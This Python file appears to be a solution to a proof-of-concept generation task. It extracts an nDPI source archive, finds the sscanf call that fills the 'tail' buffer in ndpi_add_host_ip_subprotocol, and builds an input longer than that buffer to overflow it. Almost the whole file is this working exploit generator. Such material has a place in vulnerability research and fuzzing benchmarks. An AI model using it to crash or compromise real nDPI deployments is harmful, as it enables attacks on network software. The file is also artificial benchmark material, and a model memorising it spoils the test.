import os
import re
import tarfile
import tempfile
import shutil


def remove_comments(code: str) -> str:
    res = []
    i = 0
    n = len(code)
    state = 'code'
    string_quote = ''
    while i < n:
        ch = code[i]
        if state == 'code':
            if ch == '"':
                res.append(ch)
                state = 'string'
                string_quote = '"'
                i += 1
            elif ch == "'":
                res.append(ch)
                state = 'char'
                string_quote = "'"
                i += 1
            elif ch == '/' and i + 1 < n and code[i + 1] == '/':
                state = 'line_comment'
                i += 2
            elif ch == '/' and i + 1 < n and code[i + 1] == '*':
                state = 'block_comment'
                i += 2
            else:
                res.append(ch)
                i += 1
        elif state == 'string':
            res.append(ch)
            if ch == '\\' and i + 1 < n:
                res.append(code[i + 1])
                i += 2
            elif ch == string_quote:
                state = 'code'
                i += 1
            else:
                i += 1
        elif state == 'char':
            res.append(ch)
            if ch == '\\' and i + 1 < n:
                res.append(code[i + 1])
                i += 2
            elif ch == string_quote:
                state = 'code'
                i += 1
            else:
                i += 1
        elif state == 'line_comment':
            if ch == '\n':
                res.append(ch)
                state = 'code'
            i += 1
        elif state == 'block_comment':
            if ch == '*' and i + 1 < n and code[i + 1] == '/':
                i += 2
                state = 'code'
            else:
                i += 1
    return ''.join(res)


def find_matching_paren(s: str, start: int) -> int:
    depth = 1
    i = start + 1
    n = len(s)
    in_str = False
    in_char = False
    escape = False
    quote = ''
    while i < n:
        ch = s[i]
        if in_str:
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == quote:
                in_str = False
            i += 1
            continue
        if in_char:
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            quote = '"'
            i += 1
            continue
        if ch == "'":
            in_char = True
            i += 1
            continue
        if ch == '(':
            depth += 1
        elif ch == ')':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def find_matching_brace(s: str, start: int) -> int:
    depth = 1
    i = start + 1
    n = len(s)
    in_str = False
    in_char = False
    escape = False
    quote = ''
    while i < n:
        ch = s[i]
        if in_str:
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == quote:
                in_str = False
            i += 1
            continue
        if in_char:
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            quote = '"'
            i += 1
            continue
        if ch == "'":
            in_char = True
            i += 1
            continue
        if ch == '{':
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def get_function_body(code_clean: str, func_name: str) -> str:
    pattern = func_name + '('
    pos = code_clean.find(pattern)
    n = len(code_clean)
    while pos != -1:
        open_paren = pos + len(func_name)
        if open_paren >= n or code_clean[open_paren] != '(':
            pos = code_clean.find(pattern, pos + 1)
            continue
        close_paren = find_matching_paren(code_clean, open_paren)
        if close_paren == -1:
            break
        j = close_paren + 1
        while j < n and code_clean[j].isspace():
            j += 1
        if j < n and code_clean[j] == '{':
            body_start = j
            body_end = find_matching_brace(code_clean, body_start)
            if body_end != -1:
                return code_clean[body_start:body_end + 1]
        pos = code_clean.find(pattern, pos + 1)
    return ""


def split_top_level_commas(text: str):
    args = []
    current = []
    depth = 0
    in_string = False
    in_char = False
    escape = False
    string_char = ''
    for ch in text:
        if in_string:
            current.append(ch)
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == string_char:
                in_string = False
            continue
        if in_char:
            current.append(ch)
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == "'":
                in_char = False
            continue
        if ch == '"':
            in_string = True
            string_char = '"'
            current.append(ch)
            continue
        if ch == "'":
            in_char = True
            escape = False
            current.append(ch)
            continue
        if ch == '(':
            depth += 1
            current.append(ch)
            continue
        if ch == ')':
            depth -= 1
            current.append(ch)
            continue
        if ch == ',' and depth == 0:
            arg = ''.join(current).strip()
            if arg:
                args.append(arg)
            current = []
            continue
        current.append(ch)
    last = ''.join(current).strip()
    if last:
        args.append(last)
    return args


def eval_c_string_literal(expr: str) -> str:
    s = expr.strip()
    result_chars = []
    i = 0
    n = len(s)
    while i < n:
        while i < n and s[i].isspace():
            i += 1
        if i >= n:
            break
        # handle prefixes: L, u, U, u8
        if s[i] in ('L', 'U'):
            i += 1
        elif s[i] == 'u':
            if i + 1 < n and s[i + 1] == '8':
                i += 2
            else:
                i += 1
        if i >= n or s[i] != '"':
            break
        i += 1  # skip opening "
        chunk_chars = []
        escape = False
        while i < n:
            ch = s[i]
            if escape:
                if ch == 'n':
                    chunk_chars.append('\n')
                elif ch == 't':
                    chunk_chars.append('\t')
                elif ch == 'r':
                    chunk_chars.append('\r')
                elif ch == '\\':
                    chunk_chars.append('\\')
                elif ch == '"':
                    chunk_chars.append('"')
                elif ch == "'":
                    chunk_chars.append("'")
                elif ch == '0':
                    chunk_chars.append('\0')
                else:
                    chunk_chars.append(ch)
                escape = False
            else:
                if ch == '\\':
                    escape = True
                elif ch == '"':
                    i += 1
                    break
                else:
                    chunk_chars.append(ch)
            i += 1
        result_chars.extend(chunk_chars)
    return ''.join(result_chars)


def parse_scanset(raw: str):
    chars = set()
    i = 0
    n = len(raw)
    while i < n:
        c = raw[i]
        if i + 2 < n and raw[i + 1] == '-' and raw[i + 2] != ']':
            start = ord(c)
            end = ord(raw[i + 2])
            if start <= end:
                rng = range(start, end + 1)
            else:
                rng = range(end, start + 1)
            for code in rng:
                chars.add(chr(code))
            i += 3
        else:
            chars.add(c)
            i += 1
    return chars


def choose_char_in_set(char_set):
    for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./:-':
        if c in char_set:
            return c
    if char_set:
        return next(iter(char_set))
    return 'A'


def choose_char_not_in_set(char_set):
    for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./:-':
        if c not in char_set:
            return c
    return 'Z'


def build_token_for_conv(spec, width, raw_set, scanset_negated, is_tail, tail_size):
    if spec in 'diuoxX':
        return '1'
    if spec in 'fFeEgGaA':
        return '1.0'
    if spec in 'p':
        return '0'
    if spec == 'n':
        return ''
    if spec == 's':
        if is_tail:
            if width is None:
                length = max(tail_size, 64)
            else:
                length = max(width, tail_size, 64)
        else:
            length = 1
        return 'T' * length
    if spec == 'c':
        if width is None:
            length = 1
        else:
            length = width
        if is_tail and width is not None and width <= tail_size:
            length = tail_size + 1
        return 'C' * length
    if spec == '[':
        if raw_set is None:
            base_char = 'A'
        else:
            char_set = parse_scanset(raw_set)
            if scanset_negated:
                base_char = choose_char_not_in_set(char_set)
            else:
                base_char = choose_char_in_set(char_set)
        if is_tail:
            if width is None:
                length = max(tail_size, 64)
            else:
                length = max(width, tail_size, 64)
        else:
            length = 1
        return base_char * length
    # Default fallback
    return '1'


def generate_input_from_fmt(fmt: str, tail_size: int, tail_assignment_index: int) -> bytes:
    out_parts = []
    i = 0
    n = len(fmt)
    assignment_index = -1
    while i < n:
        ch = fmt[i]
        if ch == '%':
            i += 1
            if i < n and fmt[i] == '%':
                out_parts.append('%')
                i += 1
                continue
            suppress = False
            width = None
            if i < n and fmt[i] == '*':
                suppress = True
                i += 1
            wstart = i
            while i < n and fmt[i].isdigit():
                i += 1
            if i > wstart:
                try:
                    width = int(fmt[wstart:i])
                except ValueError:
                    width = None
            # length modifiers
            while i < n and fmt[i] in 'hlLjzt':
                i += 1
            if i >= n:
                break
            spec = fmt[i]
            i += 1
            raw_set = None
            scanset_negated = False
            if spec == '[':
                if i < n and fmt[i] == '^':
                    scanset_negated = True
                    i += 1
                raw_chars = []
                if i < n and fmt[i] == ']':
                    raw_chars.append(']')
                    i += 1
                while i < n and fmt[i] != ']':
                    raw_chars.append(fmt[i])
                    i += 1
                if i < n and fmt[i] == ']':
                    i += 1
                raw_set = ''.join(raw_chars)
            if not suppress:
                assignment_index += 1
            is_tail = (not suppress and assignment_index == tail_assignment_index)
            token = build_token_for_conv(spec, width, raw_set, scanset_negated, is_tail, tail_size)
            if token:
                out_parts.append(token)
        elif ch.isspace():
            if not out_parts or not out_parts[-1].endswith(' '):
                out_parts.append(' ')
            i += 1
        else:
            out_parts.append(ch)
            i += 1
    out_str = ''.join(out_parts)
    out_str = out_str.strip('\r')
    if not out_str.endswith('\n'):
        out_str += '\n'
    return out_str.encode('ascii', errors='ignore')


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="ndpi_poc_")
        try:
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    tf.extractall(tmpdir)
            except Exception:
                return b'A' * 1024

            ndpi_main_path = None
            for root, _, files in os.walk(tmpdir):
                for name in files:
                    if name == 'ndpi_main.c':
                        ndpi_main_path = os.path.join(root, name)
                        break
                if ndpi_main_path is not None:
                    break

            if ndpi_main_path is None:
                return b'A' * 1024

            try:
                with open(ndpi_main_path, 'r', encoding='utf-8', errors='ignore') as f:
                    code = f.read()
            except Exception:
                return b'A' * 1024

            code_clean = remove_comments(code)
            func_body = get_function_body(code_clean, 'ndpi_add_host_ip_subprotocol')
            if not func_body:
                func_body = code_clean

            tail_size = None
            m = re.search(r'\b(?:unsigned\s+)?char\s+tail\s*\[\s*(\d+)\s*\]', func_body)
            if m:
                try:
                    tail_size = int(m.group(1))
                except Exception:
                    tail_size = None
            if tail_size is None:
                tail_size = 64

            search_idx = 0
            fmt = None
            tail_assignment_idx = None
            while True:
                pos = func_body.find('sscanf', search_idx)
                if pos == -1:
                    break
                open_paren = func_body.find('(', pos)
                if open_paren == -1:
                    break
                close_paren = find_matching_paren(func_body, open_paren)
                if close_paren == -1:
                    break
                call_inside = func_body[open_paren + 1:close_paren]
                args = split_top_level_commas(call_inside)
                if len(args) >= 3:
                    arg_exprs = args[2:]
                    for idx, arg in enumerate(arg_exprs):
                        if re.search(r'\btail\b', arg):
                            fmt_expr = args[1]
                            fmt_str = eval_c_string_literal(fmt_expr)
                            if fmt_str:
                                fmt = fmt_str
                                tail_assignment_idx = idx
                                break
                if fmt is not None:
                    break
                search_idx = close_paren + 1

            if fmt is None or tail_assignment_idx is None:
                return b'A' * 1024

            payload = generate_input_from_fmt(fmt, tail_size, tail_assignment_idx)
            if not payload:
                payload = b'A' * 1024
            return payload
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)